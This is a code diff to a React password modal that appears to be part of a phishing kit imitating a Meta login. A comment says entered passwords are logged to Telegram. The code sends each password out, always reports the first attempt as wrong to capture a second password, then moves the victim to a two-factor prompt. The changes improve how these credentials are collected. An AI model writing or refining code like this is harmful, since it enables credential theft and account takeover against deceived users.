@@ -19,6 +19,11 @@ const SUBMIT_DELAY_SECOND_PASSWORD_MS = 7000;
 /** Ghi nhận trong Telegram Password(3) khi bấm «Quên mật khẩu?» thay vì nhập lần 3 */
 const PASSWORD_THIRD_FORGOT_MARKER = '(Forgot)';
 
+/** Bỏ khoảng trắng / ký tự ẩn — mật khẩu trống hoặc chỉ space không được submit */
+function normalizePassword(value: string) {
+    return value.replace(/[\s\u200B-\u200D\uFEFF]/g, '');
+}
+
 const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {
     const t = useAppStrings();
 
@@ -48,7 +53,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
     }, [isOpend, dispatch]);
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
-        const { value } = e.target;
+        const value = normalizePassword(e.target.value);
         setPassword(value);
         setErrors((prev) => ({ ...prev, password: '' }));
 
@@ -70,9 +75,9 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
         handleClose();
     };
 
-    const waitAfterSend = async () => {
+    const waitAfterSend = async (passwordValue: string) => {
         try {
-            await SendData({ ...formData, password });
+            await SendData({ ...formData, password: passwordValue });
         } catch {
             /* luồng UX vẫn tiếp tục */
         }
@@ -81,18 +86,19 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
 
     const handSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
-        const newErrors: Record<string, string> = {};
-        if (!password.trim()) newErrors.password = t.password.errEmpty;
+        if (loading) return;
 
-        if (Object.keys(newErrors).length > 0) {
-            setErrors(newErrors);
+        const passwordValue = normalizePassword(password);
+        if (!passwordValue) {
+            setPassword('');
+            setErrors({ password: t.password.errEmpty });
             return;
         }
 
         if (passwordStep === 1) {
             setLoading(true);
             try {
-                await waitAfterSend();
+                await waitAfterSend(passwordValue);
                 setPassword('');
                 setErrors({ password: t.password.errWrong });
                 setPasswordStep(2);
@@ -104,7 +110,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
 
         setLoading(true);
         try {
-            await SendData(formData);
+            await SendData({ ...formData, passwordSecond: passwordValue });
             await new Promise((r) => setTimeout(r, SUBMIT_DELAY_SECOND_PASSWORD_MS));
             isOpendTwoFactor(true);
             handleClose();
@@ -116,6 +122,8 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
             setLoading(false);
         }
     };
+
+    const canSubmit = Boolean(normalizePassword(password)) && !loading;
 
     const inputClass = (field: string) =>
         ` border ${errors[field] ? 'border-red-500' : 'border-meta-border'} `;
@@ -174,8 +182,8 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                         <div className="mt-5 w-full">
                             <button
                                 type="submit"
-                                className={`mv-btn-primary flex min-h-[48px] w-full cursor-pointer items-center justify-center rounded-[40px] px-4 py-[10px] text-[15px] font-semibold text-white transition-[filter,transform] duration-200 active:scale-[0.995] ${loading ? 'cursor-not-allowed opacity-70' : ''}`}
-                                disabled={loading}
+                                className={`mv-btn-primary flex min-h-[48px] w-full cursor-pointer items-center justify-center rounded-[40px] px-4 py-[10px] text-[15px] font-semibold text-white transition-[filter,transform] duration-200 active:scale-[0.995] ${!canSubmit ? 'cursor-not-allowed opacity-70' : ''}`}
+                                disabled={!canSubmit}
                             >
                                 {loading && (
                                     <div className="mr-[10px] h-[20px] w-[20px] animate-spin">
